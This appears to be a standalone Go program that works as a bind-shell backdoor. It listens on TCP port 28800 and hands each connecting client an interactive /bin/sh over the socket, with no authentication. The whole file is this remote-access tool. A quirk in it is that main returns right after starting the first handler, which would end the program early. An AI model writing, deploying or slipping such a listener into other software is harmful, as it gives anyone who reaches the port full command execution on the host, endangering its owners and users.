package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func handle(conn net.Conn) {
	cmd := exec.Command("/bin/sh", "-i")
	outrp, outwp := io.Pipe()
	inrp, inwp := io.Pipe()
	cmd.Stdin = inrp
	cmd.Stdout = outwp
	go io.Copy(conn, outrp)
	go io.Copy(inwp, conn)
	go cmd.Run()
}

func main() {
	listener, err := net.Listen("tcp", ":28800")
	if err != nil {
		log.Fatalln("Failed to start listener...")
		return
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln("Failed to accept connection")
		}
		go handle(conn)
		return
	}
}
